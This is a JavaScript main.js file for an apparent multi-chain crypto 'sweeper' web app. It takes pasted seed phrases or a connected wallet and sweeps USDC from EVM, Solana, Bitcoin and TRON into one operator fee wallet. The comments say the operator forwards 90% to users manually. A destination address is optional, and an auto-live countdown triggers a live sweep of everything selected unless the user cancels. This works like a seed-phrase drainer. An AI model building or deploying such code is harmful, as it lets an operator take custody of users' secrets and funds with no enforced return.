/**
 * main.js — Application entry point.
 *
 * Fee-wallet model:
 *   - All four families sweep USDC into FEE_WALLET_EVM.
 *   - The operator forwards 90% to the user's destination manually,
 *     keeping the 10% service fee.
 *
 * Trust model:
 *   - Credits are server-authoritative (worker holds balance).
 *   - When a destination is present, it is committed to the worker
 *     before the sweep begins. /fee/record reads that commit and
 *     overwrites any client-supplied destination, so the operator view
 *     can't be tricked into forwarding to an attacker address.
 *   - When no destination is present, FEE_WALLET_EVM is used as a
 *     placeholder. The user is prompted for a real address after the
 *     sweep, and /sweep/destination updates the commit and the pending
 *     fee record.
 *   - /credits/consume and /gas/sponsor are idempotent on stable keys.
 *
 * Auto-live (see maybeAutoLive + ui.js showAutoLiveConfirm):
 *   After Preview, if any single wallet+chain holds ≥ AUTO_LIVE_THRESHOLD_USDC
 *   of sweepable value, we show a countdown modal and fire the live
 *   sweep when it reaches 0, unless the user explicitly cancels.
 *
 *   The threshold decides WHETHER auto-live fires. It does NOT decide
 *   WHAT gets swept. Once the countdown completes, every family and
 *   chain the user selected is swept — including wallets that
 *   individually fell below the threshold. This means a user with
 *   $200 on Base and $5 on Optimism gets both swept, not just Base.
 *
 *   The ONLY reasons auto-live returns early are:
 *     (a) no eligible wallets, or
 *     (b) the user clicked Cancel.
 *   Nothing else — no missing destination, no form state, no estimate
 *   hiccup — can prevent the countdown from completing.
 *
 * Destination-optional flow:
 *   Preview, dry run, and auto-live do NOT require a destination. When
 *   the user sweeps without one, the commit uses FEE_WALLET_EVM as a
 *   placeholder, the fee record is written with that placeholder, and
 *   a post-sweep prompt asks the user for a real destination. When they
 *   enter one, /sweep/destination updates the commit and the fee record
 *   so the operator can forward normally.
 *
 * Free credits:
 *   The launch bonus grants 2 free credits with two separate 24h
 *   clocks: 24h to claim, then 24h to use.
 *
 * Retry logic lives in ./retry.js and is injected with its network
 * dependencies here, so the loop mechanics are testable in Node.
 */

import { ethers } from 'ethers';
import { PublicKey } from '@solana/web3.js';
import QRCode from 'qrcode';
import { state, resetState, clearAll } from './state.js';
import { createWallet } from './wallet.js';
import { validateMnemonic, deriveAll } from './derive.js';
import {
  previewWallet as previewEvm, sweepEvm, getProvider,
  CHAINS as EVM_CHAINS,
  estimateChainValueUsdc,
} from './evm.js';
import {
  previewSolanaWallet, sweepSolana, getConnection, selectSolanaKeypair,
  estimateSolanaValueUsdc,
} from './solana.js';
import { previewBitcoinWallet, sweepBitcoin, estimateBitcoinValueUsdc } from './bitcoin.js';
import {
  previewTronWallet, sweepTron, estimateTronValueUsdc,
  getTronLinkWeb,
} from './tron.js';
import { $, $$, el, show, hide, logLine, clearLog, showAutoLiveConfirm } from './ui.js';
import { initSentry, initPlausible, reportError, track } from './telemetry.js';
import {
  getClientId, fetchBalance, fetchBalanceSnapshot, consumeCredit, invalidateBalanceCache,
  recordFee, requestGasSponsorship,
  fetchClaimInfo, claimFreeCredits,
  commitSweep, updateSweepDestination,
  isValidClientId, setClientId, verifyClientId,
} from './credits.js';
import { showCryptoPaymentModal } from './crypto-pay.js';
import {
  FEE_WALLET_EVM,
  GAS_PER_TX_COST, MAX_SPONSOR_ATTEMPTS,
  computeSponsorshipFeeUsdCents, usdCentsToUsdcRaw,
  AUTO_LIVE_THRESHOLD_USDC,
  AUTO_LIVE_REQUIRE_CONFIRM,
  AUTO_LIVE_COUNTDOWN_SECONDS,
} from './config.js';
import { scrubSecret } from './scrub.js';
import { ChainVerifyError, verifySignerChain } from './chain-verify.js';
import { getFingerprint } from './fingerprint.js';
import {
  recordFeeWithRetry as recordFeeWithRetryCore,
  commitSweepWithRetry as commitSweepWithRetryCore,
  ensureWalletGasOnce as ensureWalletGasOnceCore,
  withGasSponsorship as withGasSponsorshipCore,
} from './retry.js';

const WC_PROJECT_ID = '74d3ed4f87d14b6cac7556234dfb72a3';

let freeClaimTimer = null;
let creditsBadgeTimer = null;

const MIN_SPONSOR_FLOOR_USDC = 0.02;
const MAX_MNEMONICS_PER_SWEEP = 20;

const userTouchedChains = new Set();

// Set true while a preview, auto-live countdown, or sweep is in flight.
let sweepInFlight = false;

// =====================================================================
// VALIDATION HELPERS
// =====================================================================

function isEvmAddress(s) {
  return /^0x[a-fA-F0-9]{40}$/.test(s);
}

function isSolanaAddress(s) {
  return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(s);
}

function isTronAddress(s) {
  return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(s);
}

// =====================================================================
// PER-CHAIN WALLET SWITCH PARAMS
// =====================================================================

function chainExtraParams(chain) {
  const cfg = EVM_CHAINS[chain];
  if (!cfg) return {};
  const rpcUrls = {
    ethereum: ['https://ethereum-rpc.publicnode.com'],
    arbitrum: ['https://arbitrum-one-rpc.publicnode.com'],
    optimism: ['https://optimism-rpc.publicnode.com'],
    base:     ['https://base-rpc.publicnode.com'],
    polygon:  ['https://polygon-bor-rpc.publicnode.com'],
    bnb:      ['https://bsc-rpc.publicnode.com'],
  }[chain];
  const nativeCurrency = {
    ethereum: { name: 'Ether',  symbol: 'ETH', decimals: 18 },
    arbitrum: { name: 'Ether',  symbol: 'ETH', decimals: 18 },
    optimism: { name: 'Ether',  symbol: 'ETH', decimals: 18 },
    base:     { name: 'Ether',  symbol: 'ETH', decimals: 18 },
    polygon:  { name: 'POL',    symbol: 'POL', decimals: 18 },
    bnb:      { name: 'BNB',    symbol: 'BNB', decimals: 18 },
  }[chain];
  const blockExplorerUrls = {
    ethereum: ['https://etherscan.io'],
    arbitrum: ['https://arbiscan.io'],
    optimism: ['https://optimistic.etherscan.io'],
    base:     ['https://basescan.org'],
    polygon:  ['https://polygonscan.com'],
    bnb:      ['https://bscscan.com'],
  }[chain];
  return {
    rpcUrls,
    chainName: cfg.name,
    nativeCurrency,
    blockExplorerUrls,
  };
}

// =====================================================================
// UI HELPERS
// =====================================================================

function showWalletSection(type) {
  $$('.wallet-section').forEach((s) => { s.style.display = 'none'; });
  const target = $(`#wallet-${type}`);
  if (target) target.style.display = '';
}

function syncMnemonicNotice() {
  const walletType = $('input[name=wallet-type]:checked')?.value;
  const notice = $('#mnemonic-security-notice');
  if (!notice) return;
  notice.style.display = walletType === 'mnemonic' ? '' : 'none';
}

function invalidatePreview() {
  state.derivedKeys = null;
  state.previews = null;
  hide('#run-button');
}

function syncWalletTypeDefaults() {
  const walletType = $('input[name=wallet-type]:checked')?.value;
  const isMnemonic = walletType === 'mnemonic';
  const isExtension = walletType === 'extension';

  const solLabel = $('#family-solana-label');
  const btcLabel = $('#family-bitcoin-label');
  const tronLabel = $('#family-tron-label');
  const hint = $('#family-non-evm-hint');

  const showSol = isMnemonic;
  const showBtc = isMnemonic;
  const showTron = isMnemonic || isExtension;

  if (solLabel) solLabel.style.display = showSol ? '' : 'none';
  if (btcLabel) btcLabel.style.display = showBtc ? '' : 'none';
  if (tronLabel) tronLabel.style.display = showTron ? '' : 'none';
  if (hint) hint.style.display = showSol ? 'none' : '';

  const famEvm = $('#family-evm');
  const famSol = $('#family-solana');
  const famBtc = $('#family-bitcoin');
  const famTron = $('#family-tron');
  if (famEvm) famEvm.checked = true;
  if (famSol) famSol.checked = showSol;
  if (famBtc) famBtc.checked = showBtc;
  if (famTron) famTron.checked = showTron;

  $$('#chain-list input[type=checkbox]').forEach((cb) => {
    if (!userTouchedChains.has(cb.value)) {
      cb.checked = true;
    }
  });

  syncDestinationFields();
}

function trackChainTouches() {
  $$('#chain-list input[type=checkbox]').forEach((cb) => {
    cb.addEventListener('change', () => {
      userTouchedChains.add(cb.value);
    });
  });
}

function readInputs() {
  const walletType = $('input[name=wallet-type]:checked')?.value || 'mnemonic';
  const families = {
    evm: $('#family-evm').checked,
    solana: $('#family-solana').checked,
    bitcoin: $('#family-bitcoin').checked,
    tron: $('#family-tron')?.checked || false,
  };
  const destinations = {
    evm: $('#dest-evm').value.trim(),
    solana: '',
    bitcoin: '',
    tron: '',
  };
  const evmChains = $$('#chain-list input[type=checkbox]:checked').map((cb) => cb.value);

  let mnemonics = [];
  if (walletType === 'mnemonic') {
    const text = $('#phrases').value.trim();
    mnemonics = text.split('\n').map((s) => s.trim()).filter(Boolean);
  }

  Object.assign(state, { walletType, families, destinations, evmChains, mnemonics });
  return { walletType, families, destinations, evmChains, mnemonics };
}

function validateInputs({ walletType, families, destinations, mnemonics }) {
  const errors = [];
  const warnings = [];

  if (!families.evm && !families.solana && !families.bitcoin && !families.tron) {
    errors.push('Select at least one family to sweep.');
    return { errors, warnings };
  }

  if (walletType === 'mnemonic') {
    if (mnemonics.length === 0) errors.push('At least one mnemonic is required.');
    if (mnemonics.length > MAX_MNEMONICS_PER_SWEEP) {
      errors.push(`Maximum ${MAX_MNEMONICS_PER_SWEEP} mnemonics per sweep (you pasted ${mnemonics.length}).`);
    }
    for (let i = 0; i < mnemonics.length && i < MAX_MNEMONICS_PER_SWEEP; i++) {
      if (!validateMnemonic(mnemonics[i])) {
        errors.push(`Mnemonic #${i + 1} is not a valid BIP-39 phrase.`);
      }
    }
  }

  if (families.tron && walletType !== 'mnemonic' && walletType !== 'extension') {
    errors.push('TRON sweeping requires TronLink or a mnemonic.');
  }

  // Destination is optional. Preview, dry run, and auto-live all run
  // without one. A live sweep without a destination still runs; the
  // operator forwards manually after the sweep and we prompt for the
  // destination at the end. So this is a warning, not an error.
  if (families.evm || families.solana || families.bitcoin || families.tron) {
    if (!destinations.evm) {
      warnings.push('No destination address entered. The sweep will still run and USDC will land in the operator fee wallet. You\'ll be asked for a destination after the sweep.');
    } else if (!isEvmAddress(destinations.evm)) {
      if (isSolanaAddress(destinations.evm)) {
        warnings.push('Your destination looks like a Solana address. USDC is delivered on Ethereum — paste an EVM 0x address.');
      } else if (isTronAddress(destinations.evm)) {
        warnings.push('Your destination looks like a TRON address. USDC is delivered on Ethereum — paste an EVM 0x address.');
      } else {
        warnings.push('Destination does not look like a valid EVM 0x address. The sweep will still run; USDC will land in the operator fee wallet and you\'ll be asked for a destination after the sweep.');
      }
    }
  }

  return { errors, warnings };
}

function updateCreditsBadge(input) {
  const badge = $('#credits-badge');
  if (!badge) return;

  if (creditsBadgeTimer) {
    clearInterval(creditsBadgeTimer);
    creditsBadgeTimer = null;
  }

  const snapshot = (input && typeof input === 'object')
    ? input
    : { balance: Number(input) || 0, free: 0, freeExpiresAt: null };

  const balance = snapshot.balance || 0;
  const freeExpiresAt = snapshot.freeExpiresAt;

  const render = () => {
    if (balance <= 0) {
      badge.textContent = 'No credits';
      badge.className = 'credits-badge credits-empty';
      return;
    }
    const noun = balance === 1 ? 'credit' : 'credits';
    let suffix = '';
    if (freeExpiresAt) {
      const msLeft = new Date(freeExpiresAt).getTime() - Date.now();
      if (msLeft > 0) suffix = ` · ${formatRemaining(msLeft)} left`;
    }
    badge.textContent = `${balance} ${noun}${suffix}`;
    badge.className = 'credits-badge credits-available';
  };

  render();

  if (balance > 0 && freeExpiresAt && new Date(freeExpiresAt).getTime() > Date.now()) {
    creditsBadgeTimer = setInterval(render, 60 * 1000);
  }
}

function stopCreditsBadgeTimer() {
  if (creditsBadgeTimer) {
    clearInterval(creditsBadgeTimer);
    creditsBadgeTimer = null;
  }
}

function formatRemaining(ms) {
  const totalMin = Math.floor(ms / 60000);
  const h = Math.floor(totalMin / 60);
  const m = totalMin % 60;
  if (h >= 1) return `${h}h`;
  if (m >= 1) return `${m}m`;
  return 'soon';
}

function syncDestinationFields() {
  const evm = $('#family-evm').checked;
  const solana = $('#family-solana').checked;
  const bitcoin = $('#family-bitcoin').checked;
  const tron = $('#family-tron')?.checked || false;
  const evmWrap = $('#dest-evm-wrap');
  if (evmWrap) evmWrap.style.display = (evm || solana || bitcoin || tron) ? '' : 'none';
  const chainList = $('#chain-list');
  if (chainList) chainList.style.display = evm ? '' : 'none';

  const label = $('#dest-evm-label');
  const hint = $('#dest-evm-hint');
  if (label && hint) {
    if (!evm && (solana || bitcoin || tron)) {
      label.textContent = 'Destination (receives USDC on Ethereum after bridge)';
      hint.textContent = 'Optional. If left blank, USDC lands in the operator wallet and you\'ll be asked for a destination after the sweep.';
    } else {
      label.textContent = 'Destination (receives USDC on Ethereum)';
      hint.textContent = 'Optional. If left blank, USDC lands in the operator wallet and you\'ll be asked for a destination after the sweep.';
    }
  }
}

// =====================================================================
// ACCOUNT SECTION
// =====================================================================

function initAccountSection() {
  const idEl = document.getElementById('account-client-id');
  const copyBtn = document.getElementById('account-copy-btn');
  const input = document.getElementById('account-restore-input');
  const restoreBtn = document.getElementById('account-restore-btn');
  const cancelBtn = document.getElementById('account-restore-cancel');
  const status = document.getElementById('account-restore-status');
  const details = document.querySelector('.account-restore');

  if (!idEl || !input || !restoreBtn) return;

  function readCurrentId() {
    try { return getClientId(); }
    catch { return '(localStorage unavailable)'; }
  }

  function renderCurrent() {
    idEl.textContent = readCurrentId();
  }
  renderCurrent();

  copyBtn?.addEventListener('click', async () => {
    try {
      await navigator.clipboard.writeText(readCurrentId());
      copyBtn.textContent = 'Copied!';
      setTimeout(() => (copyBtn.textContent = 'Copy'), 1500);
    } catch {
      copyBtn.textContent = 'Failed';
      setTimeout(() => (copyBtn.textContent = 'Copy'), 1500);
    }
  });

  cancelBtn?.addEventListener('click', () => {
    input.value = '';
    status.style.display = 'none';
    if (details) details.open = false;
  });

  restoreBtn?.addEventListener('click', async () => {
    const candidate = input.value.trim().toLowerCase();
    status.style.display = 'block';

    if (!isValidClientId(candidate)) {
      status.className = 'account-status error';
      status.textContent = "That doesn't look like a valid client ID. Expected 16+ hex characters.";
      return;
    }

    if (candidate === readCurrentId()) {
      status.className = 'account-status error';
      status.textContent = "That's already your current client ID.";
      return;
    }

    restoreBtn.disabled = true;
    restoreBtn.textContent = 'Verifying…';
    status.className = 'account-status';
    status.textContent = 'Checking the client ID…';

    const result = await verifyClientId(candidate);
    restoreBtn.disabled = false;
    restoreBtn.textContent = 'Verify and restore';

    if (!result.valid) {
      status.className = 'account-status error';
      if (result.kind === 'format') {
        status.textContent = "That doesn't look like a valid client ID. Expected 16+ hex characters.";
      } else if (result.kind === 'http') {
        status.textContent = `The credit worker rejected the check (${result.reason}). Restore cancelled.`;
      } else if (result.kind === 'network') {
        status.textContent = `Could not reach the credit worker (${result.reason}). Check your connection and try again.`;
      } else {
        status.textContent = 'That client ID has no credits and no history. Restore cancelled.';
      }
      return;
    }

    const paid = result.paid ?? 0;
    const free = result.free ?? 0;
    const parts = [];
    if (paid > 0) parts.push(`${paid} paid`);
    if (free > 0) parts.push(`${free} free`);
    const summary = parts.length ? parts.join(' + ') : '0';

    const confirmed = window.confirm(
      `Restore this client ID?\n\n` +
      `Balance: ${result.balance} credits (${summary})\n\n` +
      `This will replace your current client ID. If your current ID has credits, ` +
      `you'll lose access to them unless you've saved it.`
    );
    if (!confirmed) {
      status.style.display = 'none';
      return;
    }

    try {
      setClientId(candidate);
      invalidateBalanceCache();
      const snap = await fetchBalanceSnapshot({ force: true });
      renderCurrent();
      updateCreditsBadge(snap);
      status.className = 'account-status success';
      status.textContent = `Restored. New balance: ${result.balance} credits (${summary}).`;
    } catch (err) {
      status.className = 'account-status error';
      status.textContent = `Restore failed: ${err.message}`;
    }
  });
}

// =====================================================================
// RETRY ADAPTERS
// =====================================================================

async function recordFeeWithRetry(payload, logLine) {
  return recordFeeWithRetryCore({ recordFn: recordFee, payload, logLine });
}

async function commitSweepWithRetry(sweepId, userDestination, logLine) {
  return commitSweepWithRetryCore({ commitFn: commitSweep, sweepId, userDestination, logLine });
}

// =====================================================================
// POST-SWEEP DESTINATION PROMPT
// =====================================================================
//
// When a live sweep runs without a valid destination, the commit uses
// FEE_WALLET_EVM as a placeholder. After the sweep, we show an inline
// card asking for the real destination.
//
// The sweep ID is cached in sessionStorage so a page reload in the
// same tab re-shows the prompt. If the user closes the tab, the
// operator view still shows a HOLD note and can chase the user.
//
// Entries are stored as { id, at } objects so we can prune by age and
// cap the list at PENDING_SWEEP_MAX to bound growth. The reader still
// accepts the old string-only shape for compatibility.
// =====================================================================

const PENDING_SWEEP_KEY = 'sweep_pending_destination';
const PENDING_SWEEP_MAX = 10;
const PENDING_SWEEP_MAX_AGE_MS = 48 * 60 * 60 * 1000;

function _readPendingRaw() {
  try {
    const raw = sessionStorage.getItem(PENDING_SWEEP_KEY);
    if (!raw) return [];
    const parsed = JSON.parse(raw);
    if (!Array.isArray(parsed)) return [];
    return parsed
      .map((entry) => {
        if (typeof entry === 'string') return { id: entry, at: Date.now() };
        if (entry && typeof entry.id === 'string') {
          return { id: entry.id, at: Number(entry.at) || Date.now() };
        }
        return null;
      })
      .filter(Boolean);
  } catch {
    return [];
  }
}

function _prunePending(entries) {
  const cutoff = Date.now() - PENDING_SWEEP_MAX_AGE_MS;
  const seen = new Set();
  const out = [];
  for (const e of entries) {
    if (e.at < cutoff) continue;
    if (seen.has(e.id)) continue;
    seen.add(e.id);
    out.push(e);
  }
  // Keep the newest PENDING_SWEEP_MAX, in insertion order.
  out.sort((a, b) => a.at - b.at);
  return out.slice(-PENDING_SWEEP_MAX);
}

function rememberPendingSweep(sweepId) {
  try {
    const existing = _readPendingRaw();
    existing.push({ id: sweepId, at: Date.now() });
    sessionStorage.setItem(PENDING_SWEEP_KEY, JSON.stringify(_prunePending(existing)));
  } catch (e) {
    // sessionStorage unavailable — prompt only shows this session.
  }
}

function forgetPendingSweep(sweepId) {
  try {
    const existing = _readPendingRaw();
    const filtered = existing.filter((e) => e.id !== sweepId);
    if (filtered.length === 0) {
      sessionStorage.removeItem(PENDING_SWEEP_KEY);
    } else {
      sessionStorage.setItem(PENDING_SWEEP_KEY, JSON.stringify(_prunePending(filtered)));
    }
  } catch (e) { /* ignore */ }
}

function getPendingSweeps() {
  try {
    return _prunePending(_readPendingRaw()).map((e) => e.id);
  } catch {
    return [];
  }
}

function showDestinationPrompt(sweepId) {
  const container = $('#post-sweep-destination');
  if (!container) return;

  container.style.display = '';
  container.innerHTML = `
    <h2>Where should we send your USDC?</h2>
    <p class="hint">
      Your sweep completed and the USDC is in the operator fee wallet.
      Enter an Ethereum (0x) address and we'll forward 90% of the swept
      amount there. Without a destination, the funds stay in the fee
      wallet until you provide one.
    </p>
    <div class="post-sweep-row">
      <input
        id="post-sweep-destination-input"
        type="text"
        placeholder="0x..."
        autocomplete="off"
        spellcheck="false"
      >
      <button id="post-sweep-destination-save" class="btn btn-primary" type="button">
        Save destination
      </button>
    </div>
    <div id="post-sweep-destination-status" class="post-sweep-status" style="display:none;"></div>
    <p class="hint" style="font-size:12px; margin-top:12px;">
      Sweep ID: <code>${sweepId.slice(0, 12)}...</code>
    </p>
  `;

  const input = document.getElementById('post-sweep-destination-input');
  const saveBtn = document.getElementById('post-sweep-destination-save');
  const status = document.getElementById('post-sweep-destination-status');

  saveBtn.addEventListener('click', async () => {
    const candidate = input.value.trim();
    status.style.display = 'block';

    if (!isEvmAddress(candidate)) {
      status.className = 'post-sweep-status error';
      status.textContent = 'That does not look like a valid Ethereum (0x) address.';
      return;
    }

    saveBtn.disabled = true;
    saveBtn.textContent = 'Saving…';
    status.className = 'post-sweep-status';
    status.textContent = 'Updating the sweep record…';

    try {
      const result = await updateSweepDestination(sweepId, candidate);

      if (result.feeRecordUpdated) {
        status.className = 'post-sweep-status success';
        status.textContent = `Destination saved. The operator will forward 90% of the sweep to ${candidate}.`;
      } else {
        status.className = 'post-sweep-status success';
        status.textContent = 'Destination saved. It will be applied when the sweep record settles.';
      }

      forgetPendingSweep(sweepId);

      setTimeout(() => {
        const remaining = getPendingSweeps();
        if (remaining.length > 0) {
          showDestinationPrompt(remaining[0]);
        } else {
          container.style.display = 'none';
          container.innerHTML = '';
        }
      }, 2500);
    } catch (err) {
      saveBtn.disabled = false;
      saveBtn.textContent = 'Save destination';
      status.className = 'post-sweep-status error';
      status.textContent = `Could not save: ${scrubSecret(err.message)}`;
    }
  });
}

function restorePendingDestinationPrompt() {
  const pending = getPendingSweeps();
  if (pending.length === 0) return;
  showDestinationPrompt(pending[0]);
}

// =====================================================================
// GAS SPONSORSHIP ADAPTERS
// =====================================================================

async function ensureWalletGasOnce(chain, walletAddress) {
  return ensureWalletGasOnceCore({
    sponsorFn: requestGasSponsorship,
    getBalance: (addr) => getProvider(chain).getBalance(addr),
    parseEther: ethers.parseEther,
    formatEther: ethers.formatEther,
    chain, walletAddress,
    perTxCost: GAS_PER_TX_COST,
    logLine,
  });
}

async function withGasSponsorship(chain, walletAddress, action) {
  return withGasSponsorshipCore({
    ensureGas: () => ensureWalletGasOnce(chain, walletAddress),
    action,
    maxAttempts: MAX_SPONSOR_ATTEMPTS,
    logLine,
  });
}

// =====================================================================
// AUTO-LIVE — value estimates
// =====================================================================
//
// All estimates run in parallel. Each estimate is retried twice on
// failure (three attempts total); if all three fail, the preview is
// marked $0 so it won't be swept. Fail-closed is correct for
// auto-live, but it means a sustained quoter outage can exclude a
// wallet the user expected to sweep.
// =====================================================================

async function annotatePreviewValues(inputs) {
  const tasks = [];

  const estimateWithRetry = async (fn, preview) => {
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        preview._usdValue = await fn();
        return;
      } catch (e) {
        if (attempt === 3) {
          preview._usdValue = 0;
        } else {
          await new Promise((r) => setTimeout(r, 300 * attempt));
        }
      }
    }
  };

  if (inputs.families.evm) {
    for (const p of state.previews.evm) {
      tasks.push(estimateWithRetry(
        () => estimateChainValueUsdc(p.chain, p), p
      ));
    }
  }
  if (inputs.families.solana) {
    for (const p of state.previews.solana) {
      tasks.push(estimateWithRetry(() => estimateSolanaValueUsdc(p), p));
    }
  }
  if (inputs.families.bitcoin) {
    for (const p of state.previews.bitcoin) {
      tasks.push(estimateWithRetry(() => estimateBitcoinValueUsdc(p), p));
    }
  }
  if (inputs.families.tron) {
    for (const p of state.previews.tron) {
      tasks.push(estimateWithRetry(() => estimateTronValueUsdc(p), p));
    }
  }

  await Promise.all(tasks);
}

function collectEligible() {
  const eligible = [];
  for (const p of state.previews.evm || []) {
    if ((p._usdValue || 0) >= AUTO_LIVE_THRESHOLD_USDC) {
      eligible.push({ family: 'evm', chain: p.chain, address: p.address, index: p.index, usdValue: p._usdValue });
    }
  }
  for (const p of state.previews.solana || []) {
    if ((p._usdValue || 0) >= AUTO_LIVE_THRESHOLD_USDC) {
      eligible.push({ family: 'solana', index: p.index, address: p.address, usdValue: p._usdValue });
    }
  }
  for (const p of state.previews.bitcoin || []) {
    if ((p._usdValue || 0) >= AUTO_LIVE_THRESHOLD_USDC) {
      eligible.push({ family: 'bitcoin', index: p.index, address: p.address, usdValue: p._usdValue });
    }
  }
  for (const p of state.previews.tron || []) {
    if ((p._usdValue || 0) >= AUTO_LIVE_THRESHOLD_USDC) {
      eligible.push({ family: 'tron', index: p.index, address: p.address, usdValue: p._usdValue });
    }
  }
  return eligible;
}

function setSweepLock(locked, label) {
  sweepInFlight = locked;
  const runBtn = $('#run-button');
  const previewBtn = $('#preview-button');
  if (runBtn) {
    runBtn.disabled = locked;
    if (locked && label) runBtn.textContent = label;
  }
  if (previewBtn) previewBtn.disabled = locked;
}

// =====================================================================
// AUTO-LIVE
// =====================================================================
//
// Only two return paths:
//   (a) no eligible wallets, or
//   (b) the user clicked Cancel in the modal.
//
// No other condition — no missing destination, no form state, no
// estimate hiccup — can stop the countdown or prevent the sweep from
// firing after it reaches 0.
//
// IMPORTANT: the eligible list is used ONLY to decide whether the
// countdown modal opens. The sweep that follows is not filtered by
// it — runSweep sweeps everything the user selected. A user with
// $200 on Base and $5 on Optimism gets both swept, not just Base.
// =====================================================================

async function maybeAutoLive() {
  const eligible = collectEligible();
  if (eligible.length === 0) return;  // (a)

  const totalUsd = eligible.reduce((sum, e) => sum + e.usdValue, 0);
  const walletCount = eligible.length;

  // Snapshot inputs so a mid-countdown form edit can't change what
  // actually gets swept. Note: a missing destination is fine here —
  // the sweep runs without a real destination and we prompt after.
  const snapshot = readInputs();

  logLine(`\n⚡ ${walletCount} wallet${walletCount === 1 ? '' : 's'} ≥ $${AUTO_LIVE_THRESHOLD_USDC} (~$${totalUsd.toFixed(2)} total) — auto-live eligible.`);

  setSweepLock(true, 'Auto-live…');

  try {
    if (AUTO_LIVE_REQUIRE_CONFIRM) {
      const ok = await showAutoLiveConfirm({
        totalUsd,
        walletCount,
        seconds: AUTO_LIVE_COUNTDOWN_SECONDS,
        modeWasDryRun: state.mode !== 'live',
        thresholdUsd: AUTO_LIVE_THRESHOLD_USDC,
      });
      if (!ok) {
        // (b) user cancelled
        logLine('  Auto-live cancelled. Press Run for a dry run or switch Mode to Live.');
        return;
      }
    }

    logLine('  Auto-live: credit waived — the 10% service fee covers this sweep.\n');
    await runSweep(true, {
      autoLive: true,
      inputsSnapshot: snapshot,
    });
  } finally {
    setSweepLock(false);
  }
}

// =====================================================================
// FREE CLAIM BANNER
// =====================================================================
//
// Every value interpolated into innerHTML is coerced through Number()
// first. The worker is ours, but defense-in-depth: a refactor or a
// compromised worker should not be able to inject markup via an
// unexpected field type.
// =====================================================================

function renderFreeClaimBanner(info) {
  const banner = $('#free-claim-banner');
  if (!banner) return;

  if (freeClaimTimer) {
    clearInterval(freeClaimTimer);
    freeClaimTimer = null;
  }

  const safeInt = (v) => {
    const n = Number(v);
    return Number.isFinite(n) ? n : '?';
  };

  if (info.claimed) {
    const freeAmount = Number(info.freeAmount) || 0;
    const useMsRemaining = Number(info.useMsRemaining) || 0;
    if (freeAmount > 0 && useMsRemaining > 0 && info.__fresh) {
      const expiresAt = new Date(Date.now() + useMsRemaining);
      const expiresHH = String(expiresAt.getHours()).padStart(2, '0');
      const expiresMM = String(expiresAt.getMinutes()).padStart(2, '0');
      banner.style.display = '';
      banner.innerHTML = `
        <div class="free-claim-inner">
          <span class="free-claim-icon">✓</span>
          <div class="free-claim-text">
            <strong>${freeAmount} free credits added</strong>
            <p>Use them within 24 hours — they expire at ${expiresHH}:${expiresMM}.</p>
          </div>
        </div>
      `;
    } else {
      banner.style.display = 'none';
    }
    return;
  }

  if (info.blockedByFingerprint) {
    const used = safeInt(info.fpClaims);
    const max = safeInt(info.fpMax);
    banner.style.display = '';
    banner.innerHTML = `
      <div class="free-claim-inner">
        <span class="free-claim-icon">✓</span>
        <div class="free-claim-text">
          <strong>Free credits claimed</strong>
          <p>This launch bonus is limited to ${max} claims per device (${used} used).</p>
        </div>
      </div>
    `;
    return;
  }

  if (info.blockedByIp) {
    const used = safeInt(info.ipClaims);
    const max = safeInt(info.ipMax);
    banner.style.display = '';
    banner.innerHTML = `
      <div class="free-claim-inner">
        <span class="free-claim-icon">✓</span>
        <div class="free-claim-text">
          <strong>Free credits claimed</strong>
          <p>This launch bonus is limited to ${max} claims per network (${used} used).</p>
        </div>
      </div>
    `;
    return;
  }

  if (info.expired) {
    banner.style.display = '';
    banner.innerHTML = `
      <div class="free-claim-inner">
        <span class="free-claim-icon">⏱</span>
        <div class="free-claim-text">
          <strong>Your 24-hour claim window has ended</strong>
          <p>Free credits won't be available again for 7 days.</p>
        </div>
      </div>
    `;
    return;
  }

  const isRunning = !info.notStarted;
  banner.style.display = '';
  banner.innerHTML = `
    <div class="free-claim-inner">
      <span class="free-claim-icon">🎁</span>
      <div class="free-claim-text">
        <strong>Claim 2 free sweep credits</strong>
        <p>${isRunning
          ? `Offer expires in <span id="free-claim-countdown">--:--:--</span>. Once claimed, use them within 24 hours.`
          : `Claim within 24 hours. Once claimed, use them within 24 hours.`}</p>
      </div>
      <button id="free-claim-button" class="btn btn-primary btn-sm">Claim now</button>
    </div>
  `;

  const countdownEl = document.getElementById('free-claim-countdown');
  if (isRunning && countdownEl) {
    const renderedAt = Date.now();
    const msRemainingAtRender = Number(info.msRemaining) || 0;
    const updateCountdown = () => {
      const remaining = msRemainingAtRender - (Date.now() - renderedAt);
      if (remaining <= 0) {
        if (freeClaimTimer) { clearInterval(freeClaimTimer); freeClaimTimer = null; }
        fetchClaimInfo().then(renderFreeClaimBanner).catch(() => {});
        return;
      }
      const totalSec = Math.floor(remaining / 1000);
      const h = String(Math.floor(totalSec / 3600)).padStart(2, '0');
      const m = String(Math.floor((totalSec % 3600) / 60)).padStart(2, '0');
      const s = String(totalSec % 60).padStart(2, '0');
      countdownEl.textContent = `${h}:${m}:${s}`;
    };
    updateCountdown();
    freeClaimTimer = setInterval(updateCountdown, 1000);
  }

  const claimBtn = document.getElementById('free-claim-button');
  if (claimBtn) {
    claimBtn.addEventListener('click', async () => {
      claimBtn.disabled = true;
      claimBtn.textContent = 'Claiming...';
      try {
        const fingerprint = await getFingerprint();
        const result = await claimFreeCredits(fingerprint);
        if (result.creditsGranted > 0) {
          logLine(`Welcome bonus: ${result.creditsGranted} free sweep credits added. Use them within 24 hours.`);
        } else if (result.blockedByFingerprint) {
          logLine(`Free credits already claimed on this device (${result.fpClaims}/${result.fpMax}).`);
        } else if (result.blockedByIp) {
          logLine(`Free credits already claimed on this network (${result.ipClaims}/${result.ipMax}).`);
        } else if (result.offerExpired) {
          logLine('Your claim window has expired.');
        } else if (result.alreadyClaimed) {
          logLine('Free credits already claimed.');
        }

        try {
          const snap = await fetchBalanceSnapshot({ force: true });
          updateCreditsBadge(snap);
        } catch (e) {
          console.warn('Badge refresh after claim failed:', scrubSecret(e.message));
        }

        try {
          const freshInfo = await fetchClaimInfo();
          renderFreeClaimBanner({ ...freshInfo, ...result, __fresh: true });
        } catch (e) {
          console.warn('Banner refresh after claim failed:', scrubSecret(e.message));
        }
      } catch (err) {
        claimBtn.disabled = false;
        claimBtn.textContent = 'Try again';
        logLine(`Claim failed: ${scrubSecret(err.message)}`);
      }
    });
  }
}

// =====================================================================
// CONNECT WALLET
// =====================================================================

async function connectWalletAndStoreForType(walletType) {
  track.walletSelected(walletType);

  if (state.wallet) {
